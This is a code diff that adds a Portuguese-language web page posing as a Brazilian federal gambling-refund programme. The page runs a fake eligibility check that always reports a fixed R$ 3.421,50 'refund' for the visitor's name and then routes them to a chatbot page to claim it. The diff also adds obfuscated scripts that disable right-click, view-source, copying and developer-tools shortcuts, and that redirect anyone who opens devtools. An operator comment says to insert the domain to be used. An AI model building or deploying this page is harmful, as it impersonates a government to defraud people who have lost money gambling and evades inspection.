@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <style>
+      input,
+      textarea,
+      select,
+      button {
+        font-size: 16px !important;
+      }
+    </style>
+    <meta charset="UTF-8" />
+    <title>Programa Nacional de Reembolso de Apostas</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <style>
+      .container.verificacao {
+        background-color: #fff;
+        padding: 30px 20px;
+        max-width: 400px;
+        width: 90%;
+        box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        border-radius: 8px;
+        text-align: center;
+        margin: 30px auto;
+      }
+
+      .verificacao h2 {
+        color: #333;
+        margin-bottom: 10px;
+      }
+
+      .verificacao p {
+        color: #666;
+        margin-bottom: 20px;
+      }
+
+      input[type="text"] {
+        padding: 12px;
+        width: 90%;
+        max-width: 100%;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 16px;
+      }
+
+      .btn {
+        padding: 12px 25px;
+        background-color: #2e7d32;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+      }
+
+      .btn:hover {
+        background-color: #1b5e20;
+      }
+
+      #mensagem {
+        color: #2e7d32;
+        font-size: 18px;
+        font-weight: bold;
+      }
+
+      #btn-solicitar {
+        margin-top: 20px;
+        background-color: #0066cc;
+      }
+
+      .rodape {
+        position: fixed;
+        bottom: 0;
+        width: 100%;
+        background-color: #ffffff;
+        color: rgb(96, 96, 96);
+        text-align: center;
+        padding: 3px 3px;
+        font-size: 14px;
+        z-index: 999;
+        box-shadow: 0 -1px 5px rgba(0, 0, 0, 0.1);
+      }
+
+      @media screen and (max-width: 480px) {
+        .container.verificacao {
+          padding: 25px 15px;
+        }
+
+        input[type="text"] {
+          font-size: 14px;
+        }
+
+        .btn {
+          font-size: 14px;
+          padding: 10px 20px;
+        }
+      }
+    </style>
+
+    <!-- TROCAR O SEUDOMINIO.COM PELO DOMINIO QUE VAMOS USAR  -->
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=https://seudominio.com/noscript-blocked.html">
+    </noscript>
+
+  </head>
+  <body>
+    <div class="container">
+      <img src="images/visual-cabecalho.png" alt="Logo Governo" class="logo" />
+      <h1>Programa Nacional de Reembolso de Apostas</h1>
+      <p class="sub">Verifique se você tem valores disponíveis para resgate.</p>
+
+      <div id="quiz">
+        <div class="question active" id="q1">
+          <h2>1. Em qual plataforma você apostou?</h2>
+          <button onclick="next('q1','q2')">Blaze</button>
+          <button onclick="next('q1','q2')">Betano</button>
+          <button onclick="next('q1','q2')">Bet365</button>
+          <button onclick="next('q1','q2')">Outras</button>
+        </div>
+
+        <div class="question hidden" id="q2">
+          <h2>2. Qual o valor aproximado que você perdeu?</h2>
+          <button onclick="next('q2','q3')">Até R$500</button>
+          <button onclick="next('q2','q3')">Entre R$500 e R$2000</button>
+          <button onclick="next('q2','q3')">Mais de R$2000</button>
+        </div>
+
+        <div class="question hidden" id="q3">
+          <h2>
+            3. Você tentou recuperar seu valor com o suporte da plataforma?
+          </h2>
+          <button onclick="next('q3','q4')">Sim, mas não tive resposta</button>
+          <button onclick="next('q3','q4')">Sim, mas recusaram</button>
+          <button onclick="next('q3','q4')">Não tentei</button>
+        </div>
+
+        <div class="question hidden" id="q4">
+          <h2>4. CPF cadastrado na plataforma?</h2>
+          <button onclick="showResult()">Sim</button>
+          <button onclick="showResult()">Não sei</button>
+        </div>
+
+        <div class="question hidden" id="verificacao">
+          <div class="container verificacao">
+            <h2>Verificação de Elegibilidade</h2>
+            <p>
+              Digite seu nome completo para verificar se você possui valores
+              disponíveis para saque.
+            </p>
+            <input
+              type="text"
+              id="nome"
+              placeholder="Ex: Rafael Silva Oliveira"
+              style="font-size: 16px"
+            />
+            <button id="verificar" class="btn">VERIFICAR</button>
+
+            <div id="resultadoBox" class="hidden">
+              <h3 id="mensagem" style="display: none"></h3>
+              <button
+                id="btn-solicitar"
+                class="btn"
+                style="display: none"
+                onclick="window.location.href='/chatbot/index.html'"
+              >
+                QUERO SOLICITAR REEMBOLSO
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      function next(atual, proxima) {
+        document.getElementById(atual).classList.add("hidden");
+        document.getElementById(atual).classList.remove("active");
+        document.getElementById(proxima).classList.remove("hidden");
+        document.getElementById(proxima).classList.add("active");
+
+        // Esconder rodapé após q4
+        if (proxima === "verificacao") {
+          document.getElementById("rodape").style.display = "none";
+        }
+      }
+
+      function showResult() {
+        document.getElementById("q4").classList.add("hidden");
+        document.getElementById("verificacao").classList.remove("hidden");
+        document.getElementById("verificacao").classList.add("active");
+
+        // Também esconde o rodapé aqui
+        document.getElementById("rodape").style.display = "none";
+      }
+    </script>
+
+    <div class="rodape" id="rodape">
+      <p>Ministério das Finanças · Governo Federal</p>
+    </div>
+
+    <script>
+      function next(atual, proxima) {
+        document.getElementById(atual).classList.add("hidden");
+        document.getElementById(atual).classList.remove("active");
+        document.getElementById(proxima).classList.remove("hidden");
+        document.getElementById(proxima).classList.add("active");
+
+        if (proxima === "verificacao") {
+          document.getElementById("rodape").style.display = "none";
+        }
+      }
+
+      function showResult() {
+        next("q4", "verificacao");
+        document.getElementById("rodape").style.display = "none";
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const botao = document.getElementById("verificar");
+        if (botao) {
+          botao.addEventListener("click", function () {
+            const nome = document.getElementById("nome").value.trim();
+            if (nome.length < 5) {
+              alert("Por favor, digite seu nome completo.");
+              return;
+            }
+
+            botao.style.display = "none";
+            const container = document.querySelector(".container.verificacao");
+
+            const progressWrapper = document.createElement("div");
+            const barra = document.createElement("div");
+            const progressoTexto = document.createElement("p");
+            const porcentagemTexto = document.createElement("span");
+
+            progressWrapper.style.position = "relative";
+            progressWrapper.style.width = "100%";
+            progressWrapper.style.backgroundColor = "#ddd";
+            progressWrapper.style.borderRadius = "8px";
+            progressWrapper.style.overflow = "hidden";
+            progressWrapper.style.marginTop = "20px";
+            progressWrapper.style.height = "20px";
+
+            barra.style.width = "0%";
+            barra.style.height = "100%";
+            barra.style.backgroundColor = "#2e7d32";
+            barra.style.transition = "width 0.4s ease";
+
+            porcentagemTexto.style.position = "absolute";
+            porcentagemTexto.style.right = "10px";
+            porcentagemTexto.style.top = "50%";
+            porcentagemTexto.style.transform = "translateY(-50%)";
+            porcentagemTexto.style.fontSize = "12px";
+            porcentagemTexto.style.color = "#000";
+            porcentagemTexto.style.fontWeight = "bold";
+
+            progressoTexto.style.fontSize = "13px";
+            progressoTexto.style.color = "#666";
+            progressoTexto.style.marginTop = "10px";
+
+            progressWrapper.appendChild(barra);
+            progressWrapper.appendChild(porcentagemTexto);
+            container.appendChild(progressWrapper);
+            container.appendChild(progressoTexto);
+
+            let progresso = 0;
+            const intervalo = setInterval(() => {
+              progresso += 1;
+              barra.style.width = progresso + "%";
+              porcentagemTexto.textContent = progresso + "%";
+
+              if (progresso <= 40) {
+                progressoTexto.textContent =
+                  "Verificando seu nome nos cassinos...";
+              } else if (progresso <= 70) {
+                progressoTexto.textContent =
+                  "Verificando valor que você perdeu...";
+              } else if (progresso < 100) {
+                progressoTexto.textContent =
+                  "Finalizando a consulta em seu nome...";
+              }
+
+              if (progresso >= 100) {
+                clearInterval(intervalo);
+
+                progressoTexto.remove();
+                porcentagemTexto.remove();
+                progressWrapper.style.display = "none";
+
+                const valorFixo = "3.421,50";
+                const mensagem = `${nome}, encontramos exatamente R$ ${valorFixo} em reembolso disponível para seu CPF.`;
+                const mensagemBox = document.getElementById("mensagem");
+                mensagemBox.textContent = mensagem;
+                mensagemBox.style.display = "block";
+
+                const btnSolicitar = document.getElementById("btn-solicitar");
+                if (btnSolicitar) btnSolicitar.style.display = "inline-block";
+
+                document
+                  .getElementById("resultadoBox")
+                  .classList.remove("hidden");
+              }
+            }, 80); // Total ~8 segundos
+          });
+        }
+      });
+    </script>
+
+<script>
+  var _0x3fed54=_0x5892;(function(_0x1dada4,_0x27e853){var _0x51fcb9=_0x5892,_0x28e2b0=_0x1dada4();while(!![]){try{var _0x4564ff=-parseInt(_0x51fcb9(0x106))/0x1*(-parseInt(_0x51fcb9(0xf2))/0x2)+-parseInt(_0x51fcb9(0xed))/0x3*(parseInt(_0x51fcb9(0xee))/0x4)+-parseInt(_0x51fcb9(0xf8))/0x5+-parseInt(_0x51fcb9(0xf9))/0x6*(-parseInt(_0x51fcb9(0x108))/0x7)+parseInt(_0x51fcb9(0xf7))/0x8+-parseInt(_0x51fcb9(0xf4))/0x9+-parseInt(_0x51fcb9(0x101))/0xa*(-parseInt(_0x51fcb9(0x104))/0xb);if(_0x4564ff===_0x27e853)break;else _0x28e2b0['push'](_0x28e2b0['shift']());}catch(_0x138d58){_0x28e2b0['push'](_0x28e2b0['shift']());}}}(_0x3499,0x29025));function _0x3499(){var _0x4b162c=['13211kdLTEZ','QCzQu','4783oEHflu','onkeydown','143409fiOXDw','toString','key','141GvfLba','25512lhpioL','3|0|4|2|1','IOmQV','addEventListener','40EmRRsM','constructor','98262mTdXwn','search','qBevx','157992vdtAJl','165760yJhOGM','6occfSx','keyCode','XQZWl','ctrlKey','contextmenu','preventDefault','shiftKey','(((.+)+)+)+$','3130oQFlkn','split','rrLlw'];_0x3499=function(){return _0x4b162c;};return _0x3499();}function _0x5892(_0x294cf1,_0x339acb){var _0x31b948=_0x3499();return _0x5892=function(_0x3103d4,_0x5ed1d4){_0x3103d4=_0x3103d4-0xeb;var _0x349962=_0x31b948[_0x3103d4];return _0x349962;},_0x5892(_0x294cf1,_0x339acb);}var _0x5ed1d4=(function(){var _0x30c8e5=!![];return function(_0x11707d,_0x45b1ee){var _0x8ca992=_0x30c8e5?function(){if(_0x45b1ee){var _0x8eedb5=_0x45b1ee['apply'](_0x11707d,arguments);return _0x45b1ee=null,_0x8eedb5;}}:function(){};return _0x30c8e5=![],_0x8ca992;};}()),_0x3103d4=_0x5ed1d4(this,function(){var _0x10e556=_0x5892,_0x35dd41={'suoQm':'(((.+)+)+)+$'};return _0x3103d4[_0x10e556(0xeb)]()[_0x10e556(0xf5)](_0x35dd41['suoQm'])[_0x10e556(0xeb)]()[_0x10e556(0xf3)](_0x3103d4)['search'](_0x10e556(0x100));});_0x3103d4(),document[_0x3fed54(0xf1)](_0x3fed54(0xfd),_0x20a79c=>_0x20a79c[_0x3fed54(0xfe)]()),document[_0x3fed54(0x107)]=function(_0xb9c725){var _0x45cadb=_0x3fed54,_0x3af3a4={'XQZWl':function(_0x17c6f5,_0x57e45e){return _0x17c6f5===_0x57e45e;},'rrLlw':function(_0x28810d,_0x37a96){return _0x28810d===_0x37a96;},'QCzQu':function(_0x493555,_0x148c46){return _0x493555==_0x148c46;},'qBevx':function(_0x37ddc8,_0x3b5180){return _0x37ddc8===_0x3b5180;},'IOmQV':function(_0x5f2366,_0x72126){return _0x5f2366===_0x72126;}},_0xaf4a9e=_0x45cadb(0xef)[_0x45cadb(0x102)]('|'),_0x323032=0x0;while(!![]){switch(_0xaf4a9e[_0x323032++]){case'0':if(_0xb9c725[_0x45cadb(0xfc)]&&(_0x3af3a4[_0x45cadb(0xfb)](_0xb9c725[_0x45cadb(0xec)],'c')||_0x3af3a4[_0x45cadb(0xfb)](_0xb9c725[_0x45cadb(0xec)],'C')))return _0xb9c725[_0x45cadb(0xfe)](),![];continue;case'1':if(_0xb9c725['ctrlKey']&&_0xb9c725[_0x45cadb(0xff)]&&(_0x3af3a4[_0x45cadb(0x103)](_0xb9c725[_0x45cadb(0xec)],'I')||_0x3af3a4[_0x45cadb(0xfb)](_0xb9c725[_0x45cadb(0xec)],'J')))return _0xb9c725[_0x45cadb(0xfe)](),![];continue;case'2':if(_0x3af3a4[_0x45cadb(0x105)](_0xb9c725[_0x45cadb(0xfa)],0x7b))return _0xb9c725[_0x45cadb(0xfe)](),![];continue;case'3':if(_0xb9c725[_0x45cadb(0xfc)]&&(_0xb9c725[_0x45cadb(0xec)]==='u'||_0x3af3a4[_0x45cadb(0xf6)](_0xb9c725[_0x45cadb(0xec)],'U')))return _0xb9c725['preventDefault'](),![];continue;case'4':if(_0xb9c725[_0x45cadb(0xfc)]&&(_0xb9c725[_0x45cadb(0xec)]==='s'||_0x3af3a4[_0x45cadb(0xf0)](_0xb9c725[_0x45cadb(0xec)],'S')))return _0xb9c725[_0x45cadb(0xfe)](),![];continue;}break;}};
+  </script>
+  
+  <script>
+   function _0x278f(_0x6f147,_0x3ec191){const _0x4c4119=_0x1637();return _0x278f=function(_0xcf507,_0x353659){_0xcf507=_0xcf507-0xce;let _0x163757=_0x4c4119[_0xcf507];return _0x163757;},_0x278f(_0x6f147,_0x3ec191);}(function(_0x2675a3,_0x350bf2){const _0x1e61d8=_0x278f,_0x3bae2b=_0x2675a3();while(!![]){try{const _0xc98bee=-parseInt(_0x1e61d8(0xce))/0x1*(-parseInt(_0x1e61d8(0xd7))/0x2)+-parseInt(_0x1e61d8(0xdd))/0x3+parseInt(_0x1e61d8(0xe0))/0x4*(parseInt(_0x1e61d8(0xdf))/0x5)+-parseInt(_0x1e61d8(0xd8))/0x6*(-parseInt(_0x1e61d8(0xdc))/0x7)+-parseInt(_0x1e61d8(0xd2))/0x8*(-parseInt(_0x1e61d8(0xe3))/0x9)+parseInt(_0x1e61d8(0xe2))/0xa+-parseInt(_0x1e61d8(0xde))/0xb;if(_0xc98bee===_0x350bf2)break;else _0x3bae2b['push'](_0x3bae2b['shift']());}catch(_0x3386ab){_0x3bae2b['push'](_0x3bae2b['shift']());}}}(_0x1637,0x6300a),(function(){const _0x49a13f=_0x278f,_0x5283ff={'PoSeK':'(((.+)+)+)+$','rZggQ':function(_0x2827bc,_0x3166ac){return _0x2827bc-_0x3166ac;},'gCigk':function(_0x1183fc,_0x202df0){return _0x1183fc>_0x202df0;},'yJTRF':function(_0x4fe564,_0x4f1fc4){return _0x4fe564||_0x4f1fc4;},'TLndx':_0x49a13f(0xd3),'KTXKB':_0x49a13f(0xe1),'ZCdfE':function(_0x28c3da,_0x3e879b,_0x1b9ef8){return _0x28c3da(_0x3e879b,_0x1b9ef8);},'tXyZk':function(_0x1c7487){return _0x1c7487();}},_0x3f1cc7=(function(){let _0x2b5e84=!![];return function(_0xb43766,_0x2d21d2){const _0x35726b=_0x2b5e84?function(){const _0x52f19c=_0x278f;if(_0x2d21d2){const _0xf4ded9=_0x2d21d2[_0x52f19c(0xdb)](_0xb43766,arguments);return _0x2d21d2=null,_0xf4ded9;}}:function(){};return _0x2b5e84=![],_0x35726b;};}()),_0x3dd203=_0x5283ff[_0x49a13f(0xe6)](_0x3f1cc7,this,function(){const _0x34aea4=_0x49a13f;return _0x3dd203[_0x34aea4(0xda)]()[_0x34aea4(0xd5)](_0x5283ff[_0x34aea4(0xd6)])['toString']()[_0x34aea4(0xe7)](_0x3dd203)[_0x34aea4(0xd5)](_0x5283ff[_0x34aea4(0xd6)]);});_0x5283ff['tXyZk'](_0x3dd203);const _0x5761d6=0xa0;let _0x246be0=![];_0x5283ff[_0x49a13f(0xe6)](setInterval,function(){const _0x17d034=_0x49a13f,_0x326b9a=_0x5283ff[_0x17d034(0xe4)](window['outerWidth'],window[_0x17d034(0xd0)])>_0x5761d6,_0x1d1882=_0x5283ff['gCigk'](_0x5283ff[_0x17d034(0xe4)](window[_0x17d034(0xd1)],window[_0x17d034(0xcf)]),_0x5761d6);_0x5283ff[_0x17d034(0xd9)](_0x326b9a,_0x1d1882)?!_0x246be0&&(_0x246be0=!![],alert(_0x5283ff[_0x17d034(0xe5)]),window[_0x17d034(0xd4)]['href']=_0x5283ff['KTXKB']):_0x246be0=![];},0x1f4);}()));function _0x1637(){const _0x22e154=['ZCdfE','constructor','4IZhzZs','innerHeight','innerWidth','outerHeight','714104QvChjj','Acesso\x20negado.','location','search','PoSeK','167582BwWwLP','3337392cwuGeI','yJTRF','toString','apply','7vSeEtv','1214226XfCVHy','10668009vOjtRD','545VdaJmo','9736qvOHyR','https://g1.globo.com','3555840AOWNpZ','27QayyAB','rZggQ','TLndx'];_0x1637=function(){return _0x22e154;};return _0x1637();}
+    </script>
+
+  </body>
+</html>
